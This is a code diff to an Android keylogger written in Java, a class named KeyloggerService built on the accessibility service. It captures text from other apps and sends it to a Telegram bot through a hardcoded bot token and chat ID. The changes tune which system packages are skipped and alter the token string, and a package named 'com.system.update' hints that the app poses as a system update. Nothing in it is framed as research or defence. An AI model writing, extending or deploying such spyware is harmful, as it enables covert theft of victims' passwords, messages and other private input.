@@ -9,8 +9,7 @@ import java.io.IOException;
 import okhttp3.*;
 
 public class KeyloggerService extends AccessibilityService {
-    // ⚠️ غير البيانات هنا
-    private static final String BOT_TOKEN = "9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
+    private static final String BOT_TOKEN = "‏9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
     private static final String CHAT_ID = "6978974735";
     private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
 
@@ -31,10 +30,11 @@ public class KeyloggerService extends AccessibilityService {
 
                 if (text.trim().isEmpty() || text.equals(lastText)) return;
                 
+                // تجاهل إعدادات النظام عشان ميزهقناش
+                if (pkg.contains("settings") || pkg.contains("systemui") || pkg.equals("com.system.update")) return;
+
                 lastText = text;
                 lastPkg = pkg;
-
-                if (pkg.equals("com.system.update")) return;
 
                 if (sendRunnable != null) handler.removeCallbacks(sendRunnable);
 
